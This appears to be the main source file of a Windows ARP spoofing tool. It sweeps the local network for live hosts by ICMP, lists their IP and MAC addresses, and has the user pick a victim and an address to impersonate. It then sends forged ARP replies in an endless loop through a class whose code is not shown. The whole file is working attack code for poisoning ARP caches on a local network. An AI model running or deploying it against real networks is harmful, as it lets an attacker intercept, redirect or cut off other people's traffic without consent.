#include "ArpSpoof.h"
#include "IcmpDetect.h"
#include "global.h"
#include <stdio.h>


int main()
{
	int i;
	char c;
	in_addr addr;
	List host_list, target, p, q;

	NetworkAdapter adapter = NetworkAdapter();
	IcmpDetect detect = IcmpDetect(adapter);
	ArpSpoof arpSpoof = ArpSpoof(adapter);

	// detecting
	printf("\nsearching for alive hosts, which will takes several seconds...\n");
	detect.beginDetect(adapter);
	host_list = detect.getAliveHosts();

	// check for detection results
	if (List_isEmpty(host_list))
	{
		printf("\n\nno alive hosts found!");
		exit(1);
	}

	// display all alive hosts
	printf("\n\ngot all hosts:\n");
	for (i = 1, p = host_list->next; p; p = p->next, i++)
	{
		addr.S_un.S_addr = p->e.ipv4;
		printf("\n[%d] %s - %.2x:%.2x:%.2x:%.2x:%.2x:%.2x", i, inet_ntoa(addr),
			p->e.mac[0], p->e.mac[1], p->e.mac[2],
			p->e.mac[3], p->e.mac[4], p->e.mac[5]);
	}

	printf("\n\narp spoof -- tell <target> : <src_ip> is at <src_mac>\n");

	// locate at <target>
	printf("\nnr for <target>? ");
	scanf("%d", &i);
	for (target = host_list->next; target != NULL && i > 1; target = target->next, i--) {}

	addr.S_un.S_addr = target->e.ipv4;
	printf("<target> acquired: %s\n", inet_ntoa(addr));

	// locate at <src_ip>
	printf("\nnr for <src_ip>? ");
	scanf("%d", &i);
	for (p = host_list->next; p != NULL && i > 1; p = p->next, i--) {}

	addr.S_un.S_addr = p->e.ipv4;
	printf("<src_ip> acquired: %s\n", inet_ntoa(addr));

	printf("\ndo you want to use local_mac as <src_mac>? (y/n) ");
	fflush(stdin);
	scanf("%c", &c);
	if (c != 'y' && c != 'Y')
	{
		// locate at <src_mac>
		printf("\nnr for <src_mac>? ");
		scanf("%d", &i);
		for (q = host_list->next; q != NULL && i > 1; q = q->next, i--) {}

		addr.S_un.S_addr = q->e.ipv4;
		printf("\n<src_mac> acquired: - %.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
			q->e.mac[0], q->e.mac[1], q->e.mac[2],
			q->e.mac[3], q->e.mac[4], q->e.mac[5]);
		
		// attacking
		printf("\nattacking...");
		for (;;)
		{
			arpSpoof.beignAttack(target->e.ipv4, p->e.ipv4, q->e.mac);
			Sleep(100);
		}
	}
	else
	{
		// attacking (use local_mac)
		printf("\nattacking...");
		for (;;)
		{
			arpSpoof.beignAttack(target->e.ipv4, p->e.ipv4);
			Sleep(100);
		}
	}
}